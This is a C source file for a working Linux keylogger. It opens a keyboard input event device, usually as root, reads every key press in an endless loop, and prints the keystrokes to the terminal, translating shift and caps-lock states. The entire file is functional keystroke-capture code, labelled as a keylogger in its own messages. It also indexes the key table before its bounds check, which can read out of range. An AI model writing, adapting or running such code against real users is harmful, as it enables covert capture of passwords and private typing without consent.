#include <bits/types.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *keys[] = {
    "",  "ESC", "1", "2",  "3", "4", "5", "6",  "7", "8", "9", "0",
    "-", "=",   "",  "\t", "q", "w", "e", "r",  "t", "y", "u", "i",
    "o", "p",   "[", "]",  "",  "",  "a", "s",  "d", "f", "g", "h",
    "j", "k",   "l", ";",  "'", "",  "",  "\\", "z", "x", "c", "v",
    "b", "n",   "m", ",",  ".", "/", "",  "",   "",  " ",
};

char symbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};

size_t keys_length = sizeof(keys) / sizeof(keys[0]);

int main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "keylogger:\n\tUsage %s <event-file>\n", argv[0]);
        exit(-69);
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if (fd == -1) {
        fprintf(stderr,
                "keylogger:\n\tError: couldn't open file (you man need to "
                "open it as "
                "root)\n");
        exit(-69);
    }

    printf("keylogger:\n\tLog: Key logger is active...\n\tLog: Reading from "
           "%s...\n\n",
           argv[1]);

    struct input_event ie;

    int is_caps_on = 0;
    int is_shift_on = 0;

    while (1) {
        read(fd, &ie, sizeof(ie));

        if (ie.type != EV_KEY)
            continue;

        if (ie.code == KEY_CAPSLOCK && ie.value == 1) {
            is_caps_on = !is_caps_on;
        }

        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT) {
            is_shift_on = (ie.value == 1 || ie.value == 2);
        }

        if (ie.value != 1)
            continue;

        char *key = keys[ie.code];

        if (ie.code < keys_length && key[0] != '\0') {
            int is_upper = is_caps_on ^ is_shift_on;
            int is_alpha = key[0] >= 'a' && key[0] <= 'z';
            int is_number = key[0] >= '0' && key[0] <= '9';

            if (is_alpha && is_upper) {
                printf("%c", key[0] - 32);
            } else if (is_number && is_shift_on) {
                printf("%c", symbols[atoi(key)]);
            } else {
                printf("%s", keys[ie.code]);
            }

            fflush(stdout);
        }
    }

    return 0;
}
